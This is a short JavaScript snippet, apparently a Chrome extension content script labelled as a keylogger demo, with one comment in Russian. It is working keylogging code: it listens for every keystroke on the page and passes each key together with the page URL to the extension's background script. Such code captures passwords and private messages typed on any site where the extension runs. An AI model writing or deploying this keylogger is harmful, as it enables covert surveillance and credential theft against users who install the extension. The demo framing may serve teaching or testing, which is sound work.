document.addEventListener("keydown", (event) => {
  console.log("[Keylogger demo] pressed:", event.key, "on", location.href);

  chrome.runtime.sendMessage({
    type: "keylog",
    key: event.key,
    url: location.href
  }, (resp) => {
    // Чтобы видеть, что сообщение реально дошло
    console.log("[Keylogger demo] sendMessage response:", resp);
  });
});